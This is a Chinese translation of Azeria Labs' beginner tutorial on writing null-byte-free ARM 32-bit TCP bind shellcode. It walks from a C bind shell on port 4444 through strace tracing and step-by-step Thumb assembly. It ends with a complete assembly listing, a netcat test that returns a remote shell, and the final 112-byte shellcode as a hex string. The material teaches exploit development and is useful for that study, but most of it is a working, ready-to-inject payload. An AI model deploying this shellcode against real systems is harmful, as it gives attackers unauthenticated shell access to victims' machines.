> 原文链接: https://www.anquanke.com//post/id/94527 


# 看我如何用ARM汇编语言编写TCP Bind Shell


                                阅读量   
                                **173488**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Azeria，文章来源：azeria-labs.com
                                <br>原文地址：[https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/](https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/)

译文仅供参考，具体内容表达以及含义原文为准

## 一、前言

在本教程中，我会向大家介绍如何编写不包含null字节、可以用于实际漏洞利用场景的TCP bind shellcode。我所提到的漏洞利用过程，指的是经过许可、合法的漏洞研究过程。如果大家对软件漏洞利用技术不是特别熟练，希望我能够引导大家将这种技术用在正当场合中。如果我们找到了某个软件漏洞（比如栈溢出漏洞），希望能够测试漏洞的可利用性，此时我们就需要切实可用的shellcode。不仅如此，我们还需要通过恰当的技术来使用shellcode，使其能够在部署了安全机制的环境中正常执行。只有这样，我们才能够演示漏洞的可利用性，也能演示恶意攻击者利用这种安全缺陷的具体方法。

读完本教程后，你可以了解如何编写将shell绑定（bind）到本地端口的shellcode，也可以了解编写此类shellcode的常用手法。bind型shellcode与反弹型（reverse）shellcode差别不大，只有1~2个函数或者某些参数有所差异，其余大部分代码基本相同。编写bind或reverse shell远比创建简单的[execve() shell](https://azeria-labs.com/writing-arm-shellcode/)复杂得多。如果你想从简单的开始学起，你可以先学一下如何使用汇编语言编写简单的execve() shell，然后再深入阅读本篇教程。如果你需要重温Arm汇编知识，你可以参考我之前写的[ARM汇编基础](https://azeria-labs.com/writing-arm-assembly-part-1/)系列教程，或者参考如下这张图：

[![](https://p1.ssl.qhimg.com/t0122f89493f0b242f5.png)](https://p1.ssl.qhimg.com/t0122f89493f0b242f5.png)

在正式开始前，我想提醒大家，我们正在编写ARM平台的shellcode，因此如果手头没有ARM环境，我们首先需要搭建相应的实验环境。你可以自己搭建一个（使用[QEMU](https://azeria-labs.com/emulate-raspberry-pi-with-qemu/)模拟Raspberry Pi），也可以直接下载我搭建的现成虚拟机（[ARM LAB VM](https://azeria-labs.com/arm-lab-vm/)），一切准备就绪，可以开始工作了。

## 二、背景知识

首先介绍下什么是bind shell及其工作原理。使用bind shell时，我们可以在目标主机上打开某个通信端口，或者创建某个监听端（listener）。监听端接受我们发起的连接，返回能够访问目标系统的shell。

[![](https://p5.ssl.qhimg.com/t014635accc1f6b2413.png)](https://p5.ssl.qhimg.com/t014635accc1f6b2413.png)

使用reverse shell时，目标主机会反连至我们的主机。这种情况下，我们的主机上需要运行一个监听端，接受目标系统的反向连接。

[![](https://p0.ssl.qhimg.com/t01e5a51a8973d60605.png)](https://p0.ssl.qhimg.com/t01e5a51a8973d60605.png)

这两种shell各有其优点及缺点，需要根据目标环境来权衡使用。比如，通常情况下目标防火墙会阻拦入站连接，放行出站连接，此时如果你使用的是bind shell，虽然可以bind目标系统的某个端口，但由于防火墙阻拦了入站连接，结果就是你无法成功与之建连。因此，在某些场景中，我们可以优先选择使用reverse shell，如果防火墙配置不当，允许出站连接，那么我们的shell就能正常工作。如果你知道如何编写bind shell，你应该也知道如何编写reverse shell。一旦我们理解具体工作原理，只需要做几处改动，我们就可以将已有的汇编代码改成reverse shell代码。

为了将bind shell改写成汇编语言，我们首先需要熟悉bind shell的工作流程：

1、创建新的TCP socket。

2、将该socket绑定到某个本地端口上。

3、监听连接。

4、接受连接。

5、将STDIN、STDOUT以及STDERR重定向至新创建的客户端socket。

6、启动shell。

这个过程对应的C代码如下所示，后面我们会将该代码转化为相应的汇编代码：

```
#include &lt;stdio.h&gt; 
#include &lt;sys/types.h&gt;  
#include &lt;sys/socket.h&gt; 
#include &lt;netinet/in.h&gt; 

int host_sockid;    // socket file descriptor 
int client_sockid;  // client file descriptor 

struct sockaddr_in hostaddr;            // server aka listen address

int main() 
`{` 
    // Create new TCP socket 
    host_sockid = socket(PF_INET, SOCK_STREAM, 0); 

    // Initialize sockaddr struct to bind socket using it 
    hostaddr.sin_family = AF_INET;                  // server socket type address family = internet protocol address
    hostaddr.sin_port = htons(4444);                // server port, converted to network byte order
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);   // listen to any address, converted to network byte order

    // Bind socket to IP/Port in sockaddr struct 
    bind(host_sockid, (struct sockaddr*) &amp;hostaddr, sizeof(hostaddr)); 

    // Listen for incoming connections 
    listen(host_sockid, 2); 

    // Accept incoming connection 
    client_sockid = accept(host_sockid, NULL, NULL); 

    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(client_sockid, 0); 
    dup2(client_sockid, 1); 
    dup2(client_sockid, 2); 

    // Execute /bin/sh 
    execve("/bin/sh", NULL, NULL); 
    close(host_sockid); 

    return 0; 
`}`
```

## 三、系统函数及其参数

第一步是确定所需的系统函数、函数参数以及相应的系统调用号（system call number）。观察上述C代码，我们可知需要使用这几个函数：socket、bind、listen、accept、dup2以及execve。我们可以使用如下命令找到这些函数的系统调用号：

```
pi@raspberrypi:~/bindshell $ cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep socket
#define __NR_socketcall             (__NR_SYSCALL_BASE+102)
#define __NR_socket                 (__NR_SYSCALL_BASE+281)
#define __NR_socketpair             (__NR_SYSCALL_BASE+288)
#undef __NR_socketcall
```

需要注意的是，`_NR_SYSCALL_BASE`的值为0：

```
root@raspberrypi:/home/pi# grep -R "__NR_SYSCALL_BASE" /usr/include/arm-linux-gnueabihf/asm/
/usr/include/arm-linux-gnueabihf/asm/unistd.h:#define __NR_SYSCALL_BASE 0
```

我们所需的所有系统调用号如下所示：

```
#define __NR_socket    (__NR_SYSCALL_BASE+281)
#define __NR_bind      (__NR_SYSCALL_BASE+282)
#define __NR_listen    (__NR_SYSCALL_BASE+284)
#define __NR_accept    (__NR_SYSCALL_BASE+285)
#define __NR_dup2      (__NR_SYSCALL_BASE+ 63)
#define __NR_execve    (__NR_SYSCALL_BASE+ 11)
```

我们可以查找Linux的[man页面](//w3challs.com/syscalls/?arch=arm_strong))，了解每个函数所需的参数，也可以访问[w3challs.com](https://w3challs.com/syscalls/?arch=arm_strong)查找相关内容。

[![](https://p2.ssl.qhimg.com/t01310ad8c0788c9fd8.png)](https://p2.ssl.qhimg.com/t01310ad8c0788c9fd8.png)

接下来我们需要找到这些参数的具体取值。一种方法是使用strace来查看已成功建连的bind shell。strace命令可以用来跟踪系统调用、监视进程与Linux内核之间的交互。我们用strace来测试一下C版本的bind shell。为了减少冗余信息，我限制了输出结果，只关心我们感兴趣的那几个函数。

```
Terminal 1:
pi@raspberrypi:~/bindshell $ gcc bind_test.c -o bind_test
pi@raspberrypi:~/bindshell $ strace -e execve,socket,bind,listen,accept,dup2 ./bind_test
```

```
Terminal 2:
pi@raspberrypi:~ $ netstat -tlpn
Proto Recv-Q  Send-Q  Local Address  Foreign Address  State     PID/Program name
tcp    0      0       0.0.0.0:22     0.0.0.0:*        LISTEN    - 
tcp    0      0       0.0.0.0:4444   0.0.0.0:*        LISTEN    1058/bind_test 
pi@raspberrypi:~ $ netcat -nv 0.0.0.0 4444
Connection to 0.0.0.0 4444 port [tcp/*] succeeded!
```

[![](https://p1.ssl.qhimg.com/t018036e0588491c743.gif)](https://p1.ssl.qhimg.com/t018036e0588491c743.gif)

strace的输出结果如下所示：

```
pi@raspberrypi:~/bindshell $ strace -e execve,socket,bind,listen,accept,dup2 ./bind_test
execve("./bind_test", ["./bind_test"], [/* 49 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, `{`sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")`}`, 16) = 0
listen(3, 2) = 0
accept(3, 0, NULL) = 4
dup2(4, 0) = 0
dup2(4, 1) = 1
dup2(4, 2) = 2
execve("/bin/sh", [0], [/* 0 vars */]) = 0
```

现在，我们可以记录下汇编语言的bind shell中函数所需的参数值，如下图所示：

[![](https://p0.ssl.qhimg.com/t01f4f2e41daf405cba.png)](https://p0.ssl.qhimg.com/t01f4f2e41daf405cba.png)

## 四、逐个变换

在上一个步骤中，我们已经解答了如下几个问题，获得了汇编程序所需的所有信息：

1、我们需要哪些函数？

2、这些函数的系统调用号是多少？

3、这些函数的参数是什么？

4、这些参数的具体取什么值？

接下来我们需要综合利用这些信息，将C代码转化为汇编代码。我们可以逐个分析每个函数，重复如下过程：

1、确定每个参数所需使用的具体寄存器。

2、了解如何将所需值传递给这些寄存器。

（1）如何将某个立即数（immediate value）传递给某个寄存器。

（2）如何在不直接使用0的情况下清零某个寄存器（我们需要避免在代码中使用null字节，因此必须找到其他方法来清零寄存器或者内存中的某个值）。

（3）如何让寄存器指向保存常量及字符串的内存区域。

3、使用正确的系统调用号来调用函数，同时保持跟踪寄存器的内容变化。

（1）需要注意的是，系统调用的结果会落在r0寄存器中，也就是说，如果我们需要在另一个函数中利用之前那个函数的返回结果，那么我们需要在调用另一个函数前，将该结果保存到另一个寄存器中。

（2）举个例子：`host_sockid = socket(2, 1, 0)`，socket调用的返回结果（`host_sockid`）会落在r0寄存器中。如`listen(host_sockid, 2)`之类的其他函数会复用这个结果，因此我们需要将结果保存到另一个寄存器中。

### <a class="reference-link" name="4.1%20%E5%88%87%E6%8D%A2%E5%88%B0Thumb%E6%A8%A1%E5%BC%8F"></a>4.1 切换到Thumb模式

为了减少碰到null字节的可能性，我们要做的第一件事情就是使用Thumb模式。在Arm模式中，使用的是32位指令，在Thumb模式中，指令为16位。这意味着在减少指令大小的前提下，我们已经可以减少碰到null字节的概率。回顾一下如何切换到Thumb模式：ARM指令必须为4字节对齐指令。为了从ARM模式切换到Thumb模式，我们可以将PC寄存器的值加1，将（PC寄存器中）下一条指令地址的LSB（Least Significant Bit，最低有效位）设置为1，然后将其保存到另一个寄存器中。接下来，使用BX（分支（Branch）及交换（eXchange））指令跳转到另一个寄存器，这样处理器就会切换到Thumb模式。上面这段话对应如下两条指令：

```
.section .text
.global _start
_start:
    .ARM
    add     r3, pc, #1            
    bx      r3
```

从此时起，你写的就是Thumb代码，因此需要在代码中使用`.THUMB`指示性语句（directive）。

### <a class="reference-link" name="4.2%20%E5%88%9B%E5%BB%BA%E6%96%B0%E7%9A%84Socket"></a>4.2 创建新的Socket

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01897957cb9bbc8b3e.png)

我们所需的socket调用参数的值如下：

```
root@raspberrypi:/home/pi# grep -R "AF_INET|PF_INET |SOCK_STREAM =|IPPROTO_IP =" /usr/include/
/usr/include/linux/in.h: IPPROTO_IP = 0,                               // Dummy protocol for TCP 
/usr/include/arm-linux-gnueabihf/bits/socket_type.h: SOCK_STREAM = 1,  // Sequenced, reliable, connection-based
/usr/include/arm-linux-gnueabihf/bits/socket.h:#define PF_INET 2       // IP protocol family. 
/usr/include/arm-linux-gnueabihf/bits/socket.h:#define AF_INET PF_INET
```

设置完参数后，我们可以使用`svc`指令调用socket系统调用，所得结果为`host_sockid`，最终存放在r0寄存器中。由于我们后面还需要用到`host_sockid`，因此我们可以将这个值存放到r4寄存器中。

在ARM中，我们不能简单地将任何立即数移动到寄存器中。如果你对这一细节比较感兴趣，你可以阅读这篇[参考文章](https://azeria-labs.com/memory-instructions-load-and-store-part-4/)（在比较靠后的章节）。

为了检查我们是否可以使用某个立即数，我写了一个简单的脚本：[rotator.py](https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py)

```
pi@raspberrypi:~/bindshell $ python rotator.py
Enter the value you want to check: 281
Sorry, 281 cannot be used as an immediate number and has to be split.

pi@raspberrypi:~/bindshell $ python rotator.py
Enter the value you want to check: 200
The number 200 can be used as a valid immediate number.
50 ror 30 --&gt; 200

pi@raspberrypi:~/bindshell $ python rotator.py
Enter the value you want to check: 81
The number 81 can be used as a valid immediate number.
81 ror 0 --&gt; 81
```

最终的代码片段为：

```
.THUMB
    mov     r0, #2
    mov     r1, #1
    sub     r2, r2, r2
    mov     r7, #200
    add     r7, #81                // r7 = 281 (socket syscall number) 
    svc     #1                     // r0 = host_sockid value 
    mov     r4, r0                 // save host_sockid in r4
```

### <a class="reference-link" name="4.3%20%E7%BB%91%E5%AE%9ASocket%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3"></a>4.3 绑定Socket到本地端口

[![](https://p1.ssl.qhimg.com/t014aa554619e5b7986.png)](https://p1.ssl.qhimg.com/t014aa554619e5b7986.png)

通过第一条命令，我们将一个包含地址族、主机端口以及主机地址的结构体对象存放在文字池（literal pool）中，通过pc相对地址来引用这个对象。文字池是同一个section中的一段内存区域（因为文字池本身就是代码中的一部分），可以存放常量、字符串或者偏移量。我们无需手动计算pc相对地址，相反，我们可以使用带有便签（label）的ADR指令完成这一任务。ADR可以接受PC相对表达式，也就是带有可选偏移量的标签，其中标签的地址为与PC标签有关的相对地址。如下所示：

```
// bind(r0, &amp;sockaddr, 16)
 adr r1, struct_addr    // pointer to address, port
 [...]
struct_addr:
.ascii "x02xff"       // AF_INET 0xff will be NULLed 
.ascii "x11x5c"       // port number 4444 
.byte 1,1,1,1           // IP Address
```

接下来的5条指令为STRB（store byte）指令。STRB指令可以将寄存器中的一个字节存储到某个内存区域中。`[r1, #1]`语句的意思是将R1作为基地址，使用立即数（`#1`）作为偏移量。

在第一条指令中，我们将R1指向了存放AF_INET、本地端口以及IP地址的那个内存区域。我们可以使用静态IP地址，也可以直接使用`0.0.0.0`这个地址，这样我们的bind shell就会监听在目标主机所有的IP地址上，shellcode也更加灵活。但这样代码中会包含许多null字节。

我们需要处理掉所有的null字节，以便让我们的shellcode能够适配许多漏洞利用场景，因为某些漏洞利用技术针对的是内存损坏漏洞，而这种漏洞可能对null字节比较敏感。如果开发者没有正确使用诸如`strcpy`之类的函数，那么就会造成缓冲区溢出。`strcpy`的任务是拷贝数据，遇到null字节时才停止工作。我们利用缓冲区溢出来接管程序的执行流程，如果`strcpy`碰到null字节，那么它会停止复制我们的shellcode，因此我们的漏洞利用过程就无法顺利完成。使用STRB指令后，我们可以从寄存器中取出null字节，在执行过程中修改我们的代码。这样一来，虽然实际上我们的shellcode中没有包含null字节，但可以通过动态方式将null值添加到合适的位置中。为了实现这个功能，我们需要可写的代码段，只需在程序链接过程中使用`-N`标志即可。

这样处理后，我们的代码中已经不包含null字节，需要的时候再将null字节动态存放到合适的位置。如下图所示，我们最开始使用的是`1.1.1.1`这个IP地址，在执行过程中，这个地址会被替换为`0.0.0.0`。

[![](https://p3.ssl.qhimg.com/t012ffe38e91bc6345f.png)](https://p3.ssl.qhimg.com/t012ffe38e91bc6345f.png)

第一条STRB指令会将`x02xff`中`xff`这个占位符替换为`x00`，以便将AF_INET设置为`x02x00`。那么我们怎么知道我们使用的是一个null字节呢？原因是r2寄存器存放的恰恰就是0。还记得前面我们用过的`sub r2, r2, r2`指令吗？这条指令会将r2寄存器清零。接下来的4条指令会将`1.1.1.1`替换为`0.0.0.0`。如果你不想在`strb r2, [r1, #1]`指令后面使用4条strb指令，那么你可以使用1条`str r2, [r1, #4]`指令，也会起到同样效果。

`mov`指令会将`sockaddr_in`结构的长度值（16个字节，其中AF_INET占了2字节，PORT占了2字节，IP地址占了4字节，还有8字节的填充数据）存放到r2中。接下来，我们将r7的值加1，变成282，因为上一条系统调用后r7的值为281。

```
// bind(r0, &amp;sockaddr, 16)
    adr  r1, struct_addr   // pointer to address, port
    strb r2, [r1, #1]     // write 0 for AF_INET
    strb r2, [r1, #4]     // replace 1 with 0 in x.1.1.1
    strb r2, [r1, #5]     // replace 1 with 0 in 0.x.1.1
    strb r2, [r1, #6]     // replace 1 with 0 in 0.0.x.1
    strb r2, [r1, #7]     // replace 1 with 0 in 0.0.0.x
    mov r2, #16
    add r7, #1            // r7 = 281+1 = 282 (bind syscall number) 
    svc #1
    nop
```

### <a class="reference-link" name="4.4%20%E7%9B%91%E5%90%AC%E8%BF%9E%E6%8E%A5"></a>4.4 监听连接

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01de8b99aabf2d12f5.png)

这个步骤中，我们将之前保存的`host_sockid`存放到r0中。将R1设置为2，让r7的值加2（因为上一个系统调用后r7为282）。

```
mov     r0, r4     // r0 = saved host_sockid 
mov     r1, #2
add     r7, #2     // r7 = 284 (listen syscall number)
svc     #1
```

### <a class="reference-link" name="4.5%20%E6%8E%A5%E5%8F%97%E8%BF%9E%E6%8E%A5"></a>4.5 接受连接

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0105cd67b5fc621e1e.png)

这里我们同样需要将前面保存的`host_sockid`存放到r0中。由于我们要避开null字节，因此我们不会直接将`#0`移动到r1和r2中，相反，我们通过减法让这些寄存器清零。然后将R7值加1。调用完成后我们可以得到`client_sockid`，将这个值存放到r4中即可，此时我们已经不再需要将`host_sockid`保存到这个位置（我们会跳过C代码中的`close`函数调用语句）。

```
mov     r0, r4          // r0 = saved host_sockid 
    sub     r1, r1, r1      // clear r1, r1 = 0
    sub     r2, r2, r2      // clear r2, r2 = 0
    add     r7, #1          // r7 = 285 (accept syscall number)
    svc     #1
    mov     r4, r0          // save result (client_sockid) in r4
```

### <a class="reference-link" name="4.6%20STDIN/STDOUT/STDERR"></a>4.6 STDIN/STDOUT/STDERR

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b34f125cd041e78d.png)

`dup2`函数的系统调用号为63。此时，我们需要将前面保存的`client_sockid`再次移动到r0中，然后通过sub指令将r1设置为0。对于剩下的两个`dup2`调用语句，我们只需要在每次系统调用完成后，改变r1的值，将r0重置为`client_sockid`即可。

```
/* dup2(client_sockid, 0) */
    mov     r7, #63                // r7 = 63 (dup2 syscall number) 
    mov     r0, r4                 // r4 is the saved client_sockid 
    sub     r1, r1, r1             // r1 = 0 (stdin) 
    svc     #1
```

```
/* dup2(client_sockid, 1) */
    mov     r0, r4                 // r4 is the saved client_sockid 
    add     r1, #1                 // r1 = 1 (stdout) 
    svc     #1
```

```
/* dup2(client_sockid, 2) */
    mov     r0, r4                 // r4 is the saved client_sockid
    add     r1, #1                 // r1 = 1+1 (stderr) 
    svc     #1
```

### <a class="reference-link" name="4.7%20%E5%90%AF%E5%8A%A8shell"></a>4.7 启动shell

[![](https://p1.ssl.qhimg.com/t01103ead1df966a5d1.png)](https://p1.ssl.qhimg.com/t01103ead1df966a5d1.png)

```
// execve("/bin/sh", 0, 0) 
 adr r0, shellcode     // r0 = location of "/bin/shX"
 eor r1, r1, r1        // clear register r1. R1 = 0
 eor r2, r2, r2        // clear register r2. r2 = 0
 strb r2, [r0, #7]     // store null-byte for AF_INET
 mov r7, #11           // execve syscall number
 svc #1
 nop
```

我在[如何编写ARM Shellcode教程](https://azeria-labs.com/writing-arm-shellcode/)中给出了一个例子，这里`execve()`函数的转换过程与之前的例子相同，因此我不会再去详细解释具体步骤。

最后，我们需要在汇编代码的末尾存放一些值，如AF_INET（包含`0xff`数值，后面会被null字节替换）、端口号、IP地址以及`/bin/sh`字符串。

```
struct_addr:
.ascii "x02xff"      // AF_INET 0xff will be NULLed 
.ascii "x11x5c"     // port number 4444 
.byte 1,1,1,1        // IP Address 
shellcode:
.ascii "/bin/shX"
```

## 五、完整汇编代码

我们最终生成的bind shellcode如下所示：

```
.section .text
.global _start
    _start:
    .ARM
    add r3, pc, #1         // switch to thumb mode 
    bx r3

    .THUMB
// socket(2, 1, 0)
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2      // set r2 to null
    mov r7, #200        // r7 = 281 (socket)
    add r7, #81         // r7 value needs to be split 
    svc #1              // r0 = host_sockid value
    mov r4, r0          // save host_sockid in r4

// bind(r0, &amp;sockaddr, 16)
    adr  r1, struct_addr // pointer to address, port
    strb r2, [r1, #1]    // write 0 for AF_INET
    strb r2, [r1, #4]    // replace 1 with 0 in x.1.1.1
    strb r2, [r1, #5]    // replace 1 with 0 in 0.x.1.1
    strb r2, [r1, #6]    // replace 1 with 0 in 0.0.x.1
    strb r2, [r1, #7]    // replace 1 with 0 in 0.0.0.x
    mov r2, #16          // struct address length
    add r7, #1           // r7 = 282 (bind) 
    svc #1
    nop

// listen(sockfd, 0) 
    mov r0, r4           // set r0 to saved host_sockid
    mov r1, #2        
    add r7, #2           // r7 = 284 (listen syscall number) 
    svc #1        

// accept(sockfd, NULL, NULL); 
    mov r0, r4           // set r0 to saved host_sockid
    sub r1, r1, r1       // set r1 to null
    sub r2, r2, r2       // set r2 to null
    add r7, #1           // r7 = 284+1 = 285 (accept syscall)
    svc #1               // r0 = client_sockid value
    mov r4, r0           // save new client_sockid value to r4  

// dup2(sockfd, 0) 
    mov r7, #63         // r7 = 63 (dup2 syscall number) 
    mov r0, r4          // r4 is the saved client_sockid 
    sub r1, r1, r1      // r1 = 0 (stdin) 
    svc #1

// dup2(sockfd, 1)
    mov r0, r4          // r4 is the saved client_sockid 
    add r1, #1          // r1 = 1 (stdout) 
    svc #1

// dup2(sockfd, 2) 
    mov r0, r4          // r4 is the saved client_sockid
    add r1, #1          // r1 = 2 (stderr) 
    svc #1

// execve("/bin/sh", 0, 0) 
    adr r0, shellcode   // r0 = location of "/bin/shX"
    eor r1, r1, r1      // clear register r1. R1 = 0
    eor r2, r2, r2      // clear register r2. r2 = 0
    strb r2, [r0, #7]   // store null-byte for AF_INET
    mov r7, #11         // execve syscall number
    svc #1
    nop

struct_addr:
.ascii "x02xff" // AF_INET 0xff will be NULLed 
.ascii "x11x5c" // port number 4444 
.byte 1,1,1,1 // IP Address 
shellcode:
.ascii "/bin/shX"
```

## 六、测试shellcode

将以上汇编代码保存为`bind_shell.s`文件。在使用`ld`命令时，记得加上`-N`标志。之所以这么做，是因为我们使用了多个strb操作来修改我们的代码段（`.text`）。这就要求代码段处于可写状态，我们可以在链接过程中添加`-N`标志完成这个任务。

```
pi@raspberrypi:~/bindshell $ as bind_shell.s -o bind_shell.o &amp;&amp; ld -N bind_shell.o -o bind_shell
pi@raspberrypi:~/bindshell $ ./bind_shell
```

接下来，连接到我们设定的那个端口。

```
pi@raspberrypi:~ $ netcat -vv 0.0.0.0 4444
Connection to 0.0.0.0 4444 port [tcp/*] succeeded!
uname -a
Linux raspberrypi 4.4.34+ #3 Thu Dec 1 14:44:23 IST 2016 armv6l GNU/Linux
```

成功了！现在，我们可以将程序转换为十六进制字符串，命令如下：

```
pi@raspberrypi:~/bindshell $ objcopy -O binary bind_shell bind_shell.bin
pi@raspberrypi:~/bindshell $ hexdump -v -e '"\""x" 1/1 "%02x" ""' bind_shell.bin
x01x30x8fxe2x13xffx2fxe1x02x20x01x21x92x1axc8x27x51x37x01xdfx04x1cx12xa1x4ax70x0ax71x4ax71x8ax71xcax71x10x22x01x37x01xdfxc0x46x20x1cx02x21x02x37x01xdfx20x1cx49x1ax92x1ax01x37x01xdfx04x1cx3fx27x20x1cx49x1ax01xdfx20x1cx01x31x01xdfx20x1cx01x31x01xdfx05xa0x49x40x52x40xc2x71x0bx27x01xdfxc0x46x02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58
```

我们得到了bind shellcode！这段shellcode长度为112个字节。本文是一个初学者教程，为了简单起见，我们并没有尽量去精简这段shellcode。最初的shellcode成功后，大家可以使用各种方法来缩减指令数，这样就能缩短shellcode篇幅。

希望大家读完本文后能有所收获，可以利用所学知识来编写自己的shellcode。如果有任何意见或建议，请随时与我联系。
